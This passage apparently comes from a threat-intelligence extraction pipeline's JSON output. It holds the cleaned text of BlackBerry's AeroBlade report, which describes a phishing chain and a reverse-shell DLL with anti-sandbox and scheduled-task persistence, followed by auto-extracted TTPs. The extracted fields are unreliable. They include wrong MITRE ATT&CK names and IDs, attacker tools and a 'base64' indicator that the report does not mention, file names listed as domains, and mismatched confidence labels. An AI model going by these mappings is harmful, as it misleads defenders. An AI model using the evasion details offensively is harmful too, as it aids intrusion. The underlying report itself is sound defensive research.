              "sc",
              "ping",
              "at",
              "reg",
              "cmd",
              "zip",
              "net"
            ],
            "extraction_method": "nlp_indicator"
          }
        ],
        "nlp_analysis": {
          "processed_text": {
            "cleaned_text": "1 / 1 3 Dmitry Bestuzhev  The BlackBerry Research   Intelligence Team AeroBlade on the Hunt Targeting the U.S. Aerospace Industry blogs.blackberry.com/en/2023/11/aeroblade-on-the-hunt-targeting-us-aerospace-industry Summary BlackBerry has uncovered a previously unknown threat actor targeting an aerospace organization in the United States  with the apparent goal of conducting commercial and competitive cyber espionage. The BlackBerry Threat Research and Intelligence team is tracking this threat actor as AeroBlade. The actor used spear-phishing as a delivery mechanism: A weaponized document  sent as an email attachment  contains an embedded remote template injection technique and a malicious VBA macro code  to deliver the next stage to the final payload execution. Evidence suggests that the attacker s network infrastructure and weaponization became operational around September 2022. BlackBerry assesses with medium to high confidence that the offensive phase of the attack occurred in July 2023. The attacker improved its toolset during that time  making it stealthier  while the network infrastructure remained the same. Given the final payload functionality and the subject of the attack  BlackBerry assesses with medium to high confidence that the goal of this attack was commercial cyber espionage. Brief MITRE ATT CK Information Tactic Technique Initial Access T1566.001 Execution T1204.002  T1059.005  T1203  T1559.002  T1559.001  T1106  T1059.003 Defense EvasionT1027  T1140  T1221  T1036.005  T1027.001  Persistence T1137.001  T1053.005 Command-and- Control T1071.001  T1001  T1573.001  T1105 Exfiltration T1041  T1029   2 / 1 3 Discovery T1083  T1082  T1033  T1016 Weaponization and Technical Overview Weapons MS Office documents  PE 64 Attack Vector Spear-phishing Network InfrastructureC2 server on port 443 Targets Aerospace industry in the United States Technical Analysis Context The BlackBerry Threat Research and Intelligence team recently uncovered two campaigns by a previously unknown threat actor  which we have named AeroBlade  targeting an aerospace industry company in the U.S. We found two phases of the attack chain. The initial attack was conducted in September 2022  and based on our technical analysis  we have concluded this was a  testing  stage. The second attack occurred in July 2023. There are certain similarities between both campaigns: Both lure documents were named  [redacted].docx.  The final payload is a reverse shell. The command-and-control (C2) server IP address is the same. There are also some interesting differences between the two campaigns: The final payload of the 2023 attack is stealthier and uses more obfuscation and anti-analysis techniques. The 2023 campaign s final payload includes an option to list directories from infected victims. During an attack  a malicious Microsoft Word document called [redacted].docx is delivered via email spear-phishing  which  when executed manually by the user  employs a remote template injection to download a second stage file called  [redacted].dotm . This file in turn executes  item3.xml   which creates a reverse shell connecting to  redacted[.]redacted[.]com  over port 443. 3 / 1 3 Figure 1   AeroBlade execution chain Attack Vector First Stage The first stage of the infection is a targeted email that has a malicious document attachment with the filename [redacted].docx. When opened  the document displays text in a deliberately scrambled font  along with a  lure  message asking the potential victim to click it to enable the content in MS Office. The docx document employs remote template injection  MITRE ATT CK technique T1221  to download the second stage of the infection. 4 / 1 3 Figure 2   The malicious document displays text in a scrambled font  along with a visual lure asking the user to click it to enable content Figure 3   The  fixed  document that appears once the victim clicks the lure message to manually enable content The next-stage information is saved in an XML (eXtensible Markup Language) file inside a .dotm file. A .dotm file is a document template created by Microsoft Word  containing the default layout  settings  and macros for a document. Figure 4   Next stage parameter in the OLE file hxxp://[redacted].106.27. [redacted]/[redacted][.]dotm Once the victim opens the file and executes it by manually clicking the  Enable Content  lure message  the [redacted].dotm document discretely drops a new file to the system  and opens it. The newly downloaded document is readable  leading the victim to believe that the file initially received by email is legitimate. In fact  it s a classic cyber bait-and-switch  performed invisibly right under the victim s nose. 5 / 1 3 Figure 5   A second document is discretely downloaded and opened in place of the original malicious document It s interesting to note that the body of the first-stage document contains an executable library that runs with the help of the second stage   we ll take a closer look at this executable library a little later on in this report. Figure 6   Location of the executable library in the file list in the [redacted].docx document Second Stage The second stage of execution is the OLE document which contains the macro. The macro runs the library included in the first-stage document. 6 / 1 3 Figure 7   A macro that runs a malicious PE file The second-stage macro also copies the OLE document ([redacted].docx) to a hard-coded file name at a specific path: C:\\Users\\user\\AppData\\Local\\Temp\\[redacted].zip The final execution stage will be an executable file run on the system using the macro. Payload The final payload is a DLL that acts as a reverse shell that connects to a hard-coded C2 server. Reverse shells allow attackers to open ports to the target machines  forcing communication and enabling a complete takeover of the device. It is therefore a severe security threat. The DLL is also capable of listing all directories found on the now-infected system. It is a heavily obfuscated executable which implements complex techniques  such as: Anti-disassembly techniques to make analysis harder API hashing to hide its usage of Windows functions  The hash function used is Murmur. Custom encoding for each string used Multiple checks are implemented to avoid the malware running on an automated environment such as a sandbox  This impedes analysis. For anti-disassembly  the executable contains control flow obfuscation  usage of data between code  and dead code-executed instructions that do not affect the malware. Dead code is a section in the source code of a program which is executed  but whose result is never used in any other computation. These techniques are all added to make analysis harder for defenders. 7 / 1 3 Figure 8   Example of data between code  control flow obfuscation  and use of dead code Figure 9   Usage of evil byte  a common technique to defeat the way disassembler tools work Figure 10   Fixed evil byte showing real code execution The executable also implements techniques that causes the malware to skip execution on automated systems  such as sandboxes or antivirus (AV) emulators. These techniques include: Comparing the position of the mouse cursor using the GetCursorPos() function Comparing time elapsed on execution using the function GetTickCount() Checking to see if the number of processors is less than two  using the NumberOfProcessors from the Process Environment Block (PEB) structure Checking physical memory size using the function GlobalMemoryStatusEx() Figure 11   Checking number of processors used by the victim s machine 8 / 1 3 Figure 12   Checking available physical memory on the victim s machine After passing all those checks  the malicious DLL executes the following sequence: Decrypts embedded static configuration containing the C2 server information for it to connect to Collects system information from the infected machine Sets persistence to survive upon system reboot Finally  it connects to the C2 server  transmitting all its collected information  and spawning a reverse shell  while also sending a list of directories found on the infected system. Figure 13   Static configuration Static configuration is AES encrypted  and once decrypted  contains the following structure: First DWORD: 0x154  unknown usage  static config size is hard-coded at 72 bytes Second DWORD: 0x1BB  connects to TCP port 443 16-byte string  Pa$$w0rd  seems to be a password to connect to the C2  but it is not used in practice C2 server points to: redacted[.]redacted[.]com 9 / 1 3 Figure 14   Example of information collected from infected system Bot-collected data structure is as follows: Offset 0x3: hard-coded unknown 16 bytes computed by custom unknown encode functions Offset 0x13: username using function GetUserNameA() Offset 0x43: computer name using function GetComputerNameA() Offset 0x73: file name being executed using function GetModuleFileNameA() Offset 0x178: IPV4 addresses using function GetAdaptersInfo() Offset0x1b8: MAC addresses using function GetAdaptersInfo() Persistence is achieved via Windows Task Scheduler  where a task named  WinUpdate2  is created to run every day at 10:10 AM. Task Scheduler functions are abused by using its COM object via the CoCreateInstance() function. 1 0 / 1 3 Figure 15   Persistence is established through Windows Task Scheduler Reverse Shell Finally  the reverse shell is executed in a stealthy way. First  it gets the default standard handle by calling GetStdHandle()  then the ComSpec variable is retrieved using the GetEnvironmentVariableW() function  which by default is set to  C:\\Windows\\system32\\cmd.exe . After that  a pipe is created using CreatePipe()  and CreateProcessW() is executed  creating  cmd.exe.  Figure 16   cmd.exe CreateProcess Besides the reverse shell  the final payload can collect a complete list of directories on the victim s system by using the function GetLogicalDeviceStringsW()  looping through the list of files using FindFirstFileA()/FindNextFileA()  and then comparing with  ..  to see if a given file is actually a directory. Figure 17   String comparison with directories During our investigations  we found two samples from mid-2022:  5[redacted sha-256]7  and  5[redacted sha-256]8   which is also a reverse shell with a hard-coded C2 at  [redacted][.]165    the same IP address that the C2 server from the 2023 samples are pointing to. Both samples were 1 1 / 1 3 targeting the aerospace industry. While the 2022 samples are obfuscated  unlike the 2023 samples  they do not contain stealthier functions such as API hashing  anti-analysis techniques  or encrypted static configuration. They also don t include the capability to list directories  nor are they able to send information to a remote server. Network Infrastructure IP Domain Name [redacted].217hxxp://[redacted].217/[redacted][.]dotm hxxp://[redacted].217/[redacted] [redacted].195redacted.redacted.com [redacted].165redacted.redacted.com Targets and Attribution Based on the content of the lure message  an aerospace company in the United States was the intended target for both campaigns. The development of this threat group s toolkit indicates that the operator has been active for at least one year. Exactly who is behind these two campaigns remains unknown. Conclusions Given the relatively sophisticated technical capabilities this threat actor deployed and the victim s timelines  we conclude with a high degree of confidence that this was a commercial cyberespionage campaign. Its purpose was most likely to gain visibility over the internal resources of its target in order to weigh its susceptibility to a future ransom demand. Based on the threat actor s operations timelines   September 2022 and then July 2023   we can surmise that this shows the group s interest in the target remained consistent between the first and second campaign  as evidenced by the increased complexity of the second campaign compared to the first. During the time that elapsed between the two campaigns we observed  the threat actor put considerable effort into developing additional resources to ensure they could secure access to the sought-after information  and that they could exfiltrate it successfully. APPENDIX 1   Referential Indicators of Compromise (IoCs) 1 2 / 1 3 Second Stage Sha 265 MD5 Sha 265 MD5 Sha 256 MD5 16bd34c3f00288e46d8e3fdb67916aa7c68d8a0622f2c76c57112dae36c76875 885B04081BD89F5E23CBC59723052601 6d515dafef42a5648754de3c0fa6adfcb8b57af1c1d69e629b0d840dab7f91ec 62D3FF36EC8A721488E512E1C94B2744 abc348d3cc40521afc165aa6dc2d66fd9e654d91e3d66461724ac9490030697f A04D2C0AA0A798047161118B5D5816AA Disclaimer: The private version of this report is available upon request. It includes but is not limited to  the complete and contextual MITRE ATT CK mapping  MITRE D3FEND  countermeasures  Attack Flow by MITRE  and other threat detection content for tooling  network traffic  complete IoCs list  Yara rules  Sigma rules  and system behavior. Please email us at cti@blackberry.com for more information. For similar articles and news delivered straight to your inbox  subscribe to the BlackBerry Blog. Related Reading About Dmitry Bestuzhev Dmitry Bestuzhev is Senior Director  CTI (Cyber Threat Intelligence) at BlackBerry. Prior to BlackBerry  Dmitry was Head of Kaspersky s Global Research and Analysis Team for Latin America  where he oversaw the company s experts  anti-malware development work in the region. Dmitry has more than 20 years of experience in IT security across a wide variety of roles. His field of expertise covers everything from traditional online fraud to targeted high-profile attacks on financial and governmental institutions. His main focus in research is on producing Threat Intelligence reports on financially motivated targeted attacks.   1 3 / 1 3 About The BlackBerry Research   Intelligence Team The BlackBerry Research   Intelligence team examines emerging and persistent threats  providing intelligence analysis for the benefit of defenders and the organizations they serve.",
            "commands": [],
            "file_paths": [
              "/[redacted].217/[redacted]",
              "/[redacted][.]dotm",
              "/[redacted].217/[redacted][.]dotm",
              "C:\\Users\\user\\AppData\\Local\\Temp\\[redacted].zip",
              "/[redacted].106.27.",
              "C:\\Windows\\system32\\cmd.exe\u201d.",
              "/"
            ],
            "registry_keys": []
          },
          "entities": {
            "malware": [
              "apt",
              "malware",
              "payload",
              "rat"
            ],
            "tools": [
              "at",
              "cmd",
              "net",
              "ping",
              "reg",
              "sc"
            ],
            "threat_actors": [],
            "ips": [],
            "domains": [
              "165redacted.redacted.com",
              "195redacted.redacted.com",
              "blackberry.com",
              "blogs.blackberry.com",
              "cmd.exe",
              "item3.xml"
            ],
            "hashes": {
              "md5": [
                "62D3FF36EC8A721488E512E1C94B2744",
                "885B04081BD89F5E23CBC59723052601",
                "A04D2C0AA0A798047161118B5D5816AA"
              ],
              "sha256": [
                "16bd34c3f00288e46d8e3fdb67916aa7c68d8a0622f2c76c57112dae36c76875",
                "6d515dafef42a5648754de3c0fa6adfcb8b57af1c1d69e629b0d840dab7f91ec",
                "abc348d3cc40521afc165aa6dc2d66fd9e654d91e3d66461724ac9490030697f"
              ]
            }
          },
          "ttp_indicators": {
            "initial_access": [
              "Phishing"
            ],
            "execution": [
              "Command and Scripting Interpreter",
              "User Execution: Malicious File"
            ],
            "defense_evasion": [
              "Obfuscated Files or Information",
              "Process Injection"
            ],
            "collection": [
              "Archive Collected Data"
            ],
            "exfiltration": [
              "Exfiltration Over C2 Channel"
            ],
            "command_and_control": [
              "Application Layer Protocol"
            ]
          },
          "context": "\n**File System Activity:**\n- /[redacted].217/[redacted]\n- /[redacted][.]dotm\n- /[redacted].217/[redacted][.]dotm\n- C:\\Users\\user\\AppData\\Local\\Temp\\[redacted].zip\n- /[redacted].106.27.\n\n**Network Indicators:**\n- 165redacted.redacted.com\n- 195redacted.redacted.com\n- blogs.blackberry.com\n- item3.xml\n- blackberry.com\n- cmd.exe\n\n**Key Security Terms:** c2, decrypt, macro, command-and-control, persistence, exfiltrate, dll, encrypt, download, malware"
        },
        "metadata": {
          "extraction_method": "LangChain-Enhanced",
          "nlp_processing_time_ms": 14.551,
          "llm_processing_time_ms": 4724.575
        }
      }
    ],
    "ttps": [
      {
        "ttp_id": "1b985cdf-d878-4ac1-b77e-b158810bad66",
        "report_id": "pdf-3b7f6a06126c357830383587d841f333",
        "technique_name": "Remote Template Injection",
        "attack_id": "T1221",
        "tactic": "Initial Access",
        "description": "The docx document employs remote template injection to download the second stage of the infection",
        "confidence_score": 0.748,
        "confidence_level": "very_low",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.382,
          "tool_mentions": 1.0,
          "context_richness": 0.96,
          "multiple_sources": 0.5
        },
        "indicators": [
          "[redacted].docx",
          "remote template injection"
        ],
        "tools": [
          "sc",
          "MS Office documents",
          "ping",
          "at",
          "cmd",
          "reg",
          "zip",
          "net"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "7b76ae34-1131-40bc-a68b-56fe82b96cff",
        "report_id": "pdf-3b7f6a06126c357830383587d841f333",
        "technique_name": "Command and Scripting Interpreter",
        "attack_id": "T1059",
        "tactic": "Execution",
        "description": "Threat actor used command line tools like at, cmd, net, ping, reg for execution",
        "confidence_score": 0.694,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.7,
          "description_detail": 0.322,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "at",
          "cmd",
          "net",
          "ping",
          "reg"
        ],
        "tools": [
          "sc",
          "ping",
          "at",
          "reg",
          "cmd",
          "zip",
          "net"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "f27460b7-a4e0-4685-b1ae-f4b7f8be9222",
        "report_id": "pdf-3b7f6a06126c357830383587d841f333",
        "technique_name": "Phishing",
        "attack_id": "T1566",
        "tactic": "Initial Access",
        "description": "Detected Phishing activity via NLP pattern matching",
        "confidence_score": 0.684,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.5,
          "description_detail": 0.116,
          "tool_mentions": 1.0,
          "context_richness": 0.96,
          "multiple_sources": 0.375
        },
        "indicators": [],
        "tools": [
          "sc",
          "ping",
          "at",
          "reg",
          "cmd",
          "zip",
          "net"
        ],
        "extraction_method": "nlp_indicator"
      },
      {
        "ttp_id": "461373bc-4717-4de2-b9e1-195afd3556b9",
        "report_id": "pdf-3b7f6a06126c357830383587d841f333",
        "technique_name": "Obfuscated Files or Information",
        "attack_id": "T1027",
        "tactic": "Defense Evasion",
        "description": "The malware uses anti-disassembly techniques, API hashing, and custom encoding to make analysis harder",
        "confidence_score": 0.682,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.62,
          "description_detail": 0.322,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "C:\\Users\\user\\AppData\\Local\\Temp\\[redacted].zip",
          "GetCursorPos()",
          "GetTickCount()"
        ],
        "tools": [
          "sc",
          "Malware",
          "ping",
          "at",
          "cmd",
          "reg",
          "zip",
          "net"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "11c0a7e9-1b95-418a-9b5a-953f299f1e61",
        "report_id": "pdf-3b7f6a06126c357830383587d841f333",
        "technique_name": "Process Hollowing",
        "attack_id": "T1093",
        "tactic": "Defense Evasion",
        "description": "The malware creates a reverse shell by executing cmd.exe in a stealthy way",
        "confidence_score": 0.679,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.62,
          "description_detail": 0.299,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "cmd.exe",
          "CreatePipe()",
          "CreateProcessW()"
        ],
        "tools": [
          "sc",
          "ping",
          "cmd",
          "reg",
          "at",
          "zip",
          "net"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "8ce45c1f-8434-4914-8f18-1bbf627eb94b",
        "report_id": "pdf-3b7f6a06126c357830383587d841f333",
        "technique_name": "Obfuscated Files or Information",
        "attack_id": "T1027",
        "tactic": "Defense Evasion",
        "description": "The final payload of the 2023 attack is stealthier and uses more obfuscation and anti-analysis techniques",
        "confidence_score": 0.677,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.368,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "obfuscated files"
        ],
        "tools": [
          "sc",
          "ping",
          "cmd",
          "at",
          "reg",
          "obfuscation tools",
          "zip",
          "net"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "971916ad-37bf-45cb-8ddf-9bbab9b70c86",
        "report_id": "pdf-3b7f6a06126c357830383587d841f333",
        "technique_name": "Exfiltration Over Alternative Protocol",
        "attack_id": "T1041",
        "tactic": "Exfiltration",
        "description": "The command-and-control (C2) server IP address is the same and connects over port 443",
        "confidence_score": 0.676,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.322,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "redacted[.]redacted[.]com",
          "port 443"
        ],
        "tools": [
          "sc",
          "ping",
          "at",
          "cmd",
          "reg",
          "C2 server",
          "zip",
          "net"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "586d9add-e54d-476b-a43a-e6e894c7c2ea",
        "report_id": "pdf-3b7f6a06126c357830383587d841f333",
        "technique_name": "Spearphishing Attachment",
        "attack_id": "T1566.001",
        "tactic": "Initial Access",
        "description": "AeroBlade used spear-phishing as a delivery mechanism with a weaponized document sent as an email attachment",
        "confidence_score": 0.673,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.9,
          "ioc_evidence": 0.58,
          "description_detail": 0.368,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "[redacted].docx",
          "email attachment"
        ],
        "tools": [
          "sc",
          "MS Office documents",
          "ping",
          "at",
          "cmd",
          "reg",
          "zip",
          "net"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "e12a169c-94cf-4d75-a77e-174d465b5c00",
        "report_id": "pdf-3b7f6a06126c357830383587d841f333",
        "technique_name": "File and Directory Discovery",
        "attack_id": "T1083",
        "tactic": "Discovery",
        "description": "The malware collects a list of directories on the victim's system",
        "confidence_score": 0.672,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.62,
          "description_detail": 0.253,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "GetLogicalDeviceStringsW()",
          "FindFirstFileA()",
          "FindNextFileA()"
        ],
        "tools": [
          "sc",
          "Malware",
          "ping",
          "at",
          "cmd",
          "reg",
          "zip",
          "net"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "c72d5ffe-c9bf-41f1-84b9-6708fc64be62",
        "report_id": "pdf-3b7f6a06126c357830383587d841f333",
        "technique_name": "System Information Discovery",
        "attack_id": "T1082",
        "tactic": "Discovery",
        "description": "The 2023 campaign's final payload includes an option to list directories from infected victims",
        "confidence_score": 0.67,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.322,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "directory listing"
        ],
        "tools": [
          "sc",
          "ping",
          "at",
          "cmd",
          "reg",
          "final payload",
          "zip",
          "net"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "6bd399bc-9eb8-48ed-b5b4-ddeb3c5f32e6",
        "report_id": "pdf-3b7f6a06126c357830383587d841f333",
        "technique_name": "Execution of VBA Macro Code",
        "attack_id": "T1204.002",
        "tactic": "Execution",
        "description": "The malicious VBA macro code delivers the next stage to the final payload execution",
        "confidence_score": 0.666,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.9,
          "ioc_evidence": 0.58,
          "description_detail": 0.322,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "VBA macro code",
          "[redacted].dotm"
        ],
        "tools": [
          "sc",
          "MS Office documents",
          "ping",
          "at",
          "cmd",
          "reg",
          "zip",
          "net"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "5a98bc1a-e9c2-4b49-b499-443e56c4327c",
        "report_id": "pdf-3b7f6a06126c357830383587d841f333",
        "technique_name": "System Information Discovery",
        "attack_id": "T1082",
        "tactic": "Discovery",
        "description": "The malware collects system information from the infected machine",
        "confidence_score": 0.665,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.62,
          "description_detail": 0.207,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "GetUserNameA()",
          "GetComputerNameA()",
          "GetModuleFileNameA()"
        ],
        "tools": [
          "sc",
          "Malware",
          "ping",
          "at",
          "cmd",
          "reg",
          "zip",
          "net"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "d4e595aa-0f5e-4faa-965a-3d9b51038732",
        "report_id": "pdf-3b7f6a06126c357830383587d841f333",
        "technique_name": "Obfuscated Files or Information",
        "attack_id": "T1027",
        "tactic": "Defense Evasion",
        "description": "Threat actor used obfuscation to hide files or information",
        "confidence_score": 0.665,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.62,
          "description_detail": 0.207,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "Sha 265 MD5",
          "6d515dafef42a5648754de3c0fa6adfcb8b57af1c1d69e629b0d840dab7f91ec",
          "62D3FF36EC8A721488E512E1C94B2744"
        ],
        "tools": [
          "sc",
          "malware",
          "ping",
          "at",
          "cmd",
          "reg",
          "zip",
          "net"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "4548126e-6e4b-4b24-89db-d56268318e7b",
        "report_id": "pdf-3b7f6a06126c357830383587d841f333",
        "technique_name": "Exfiltration Over Alternative Protocol",
        "attack_id": "T1041",
        "tactic": "Exfiltration",
        "description": "Threat actor exfiltrated data using alternative protocols",
        "confidence_score": 0.664,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.62,
          "description_detail": 0.199,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "Sha 256 MD5",
          "16bd34c3f00288e46d8e3fdb67916aa7c68d8a0622f2c76c57112dae36c76875",
          "885B04081BD89F5E23CBC59723052601"
        ],
        "tools": [
          "sc",
          "malware",
          "ping",
          "at",
          "cmd",
          "reg",
          "zip",
          "net"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "8ca0fd9c-6756-49d5-ac7f-779942bf4972",
        "report_id": "pdf-3b7f6a06126c357830383587d841f333",
        "technique_name": "Data Staging",
        "attack_id": "T1074",
        "tactic": "Collection",
        "description": "The malware collects and transmits information to a remote server",
        "confidence_score": 0.662,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.23,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "GetAdaptersInfo()",
          "GetLogicalDeviceStringsW()"
        ],
        "tools": [
          "sc",
          "Malware",
          "ping",
          "at",
          "cmd",
          "reg",
          "zip",
          "net"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "764dc7a3-3108-4b36-b676-5337de821da9",
        "report_id": "pdf-3b7f6a06126c357830383587d841f333",
        "technique_name": "Masquerading",
        "attack_id": "T1036",
        "tactic": "Defense Evasion",
        "description": "The malware uses a legitimate process to execute malicious code",
        "confidence_score": 0.662,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.268,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "cmd.exe"
        ],
        "tools": [
          "sc",
          "Malware",
          "ping",
          "at",
          "cmd",
          "reg",
          "zip",
          "net"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "ea656dbf-3a20-49cc-afb6-6cad2d24fcf3",
        "report_id": "pdf-3b7f6a06126c357830383587d841f333",
        "technique_name": "Scheduled Task",
        "attack_id": "T1053",
        "tactic": "Persistence",
        "description": "The malware achieves persistence via Windows Task Scheduler",
        "confidence_score": 0.656,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.184,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "WinUpdate2",
          "CoCreateInstance()"
        ],
        "tools": [
          "sc",
          "ping",
          "Windows Task Scheduler",
          "at",
          "cmd",
          "reg",
          "zip",
          "net"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "fb80cead-412a-4fd5-8ed9-54cd19659bca",
        "report_id": "pdf-3b7f6a06126c357830383587d841f333",
        "technique_name": "Command and Control",
        "attack_id": "T1071",
        "tactic": "Command and Control",
        "description": "The malware connects to a hard-coded C2 server",
        "confidence_score": 0.656,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.184,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "[redacted].165",
          "[redacted].217"
        ],
        "tools": [
          "sc",
          "Malware",
          "ping",
          "at",
          "cmd",
          "reg",
          "zip",
          "net"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "a246f4f9-2f74-489c-b03d-fa87ba2bdd09",
        "report_id": "pdf-3b7f6a06126c357830383587d841f333",
        "technique_name": "Resource Development",
        "attack_id": "T1583",
        "tactic": "Resource Development",
        "description": "Threat actor developed additional resources for campaign",
        "confidence_score": 0.652,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.58,
          "description_detail": 0.161,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "September 2022",
          "July 2023"
        ],
        "tools": [
          "sc",
          "malware",
          "ping",
          "at",
          "cmd",
          "reg",
          "zip",
          "net"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "73c200ca-63ff-43ec-9bf5-c7b9cbb8e853",
        "report_id": "pdf-3b7f6a06126c357830383587d841f333",
        "technique_name": "Create or Modify System Process",
        "attack_id": "T1543.001",
        "tactic": "Persistence",
        "description": "The attacker created a reverse shell connecting to the C2 server",
        "confidence_score": 0.65,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.9,
          "ioc_evidence": 0.54,
          "description_detail": 0.253,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "reverse shell"
        ],
        "tools": [
          "sc",
          "reverse shell tools",
          "ping",
          "at",
          "cmd",
          "reg",
          "zip",
          "net"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "b902fa20-18a9-424f-9a87-66274aaa20a3",
        "report_id": "pdf-3b7f6a06126c357830383587d841f333",
        "technique_name": "Data Encoding",
        "attack_id": "T1132",
        "tactic": "Command and Control",
        "description": "Threat actor used encoding to exfiltrate data",
        "confidence_score": 0.646,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.95,
          "ioc_evidence": 0.54,
          "description_detail": 0.161,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "base64"
        ],
        "tools": [
          "sc",
          "malware",
          "ping",
          "at",
          "cmd",
          "reg",
          "zip",
          "net"
        ],
        "extraction_method": "langchain_llm"
      },
      {
        "ttp_id": "0c245210-8dcf-450e-901a-20876970e2e0",
        "report_id": "pdf-3b7f6a06126c357830383587d841f333",
        "technique_name": "Process Discovery",
        "attack_id": "T1053.005",
        "tactic": "Discovery",
        "description": "The attacker discovered processes on the victim's system",
        "confidence_score": 0.645,
        "confidence_level": "medium",
        "confidence_breakdown": {
          "report_confidence": 0.8,
          "attack_mapping": 0.9,
          "ioc_evidence": 0.54,
          "description_detail": 0.222,
          "tool_mentions": 1.0,
          "context_richness": 0.54,
          "multiple_sources": 0.5
        },
        "indicators": [
          "process discovery"
        ],
        "tools": [
          "sc",
          "discovery tools",
          "ping",
          "at",
          "cmd",
          "reg",
          "zip",
          "net"
        ],
        "extraction_method": "langchain_llm"
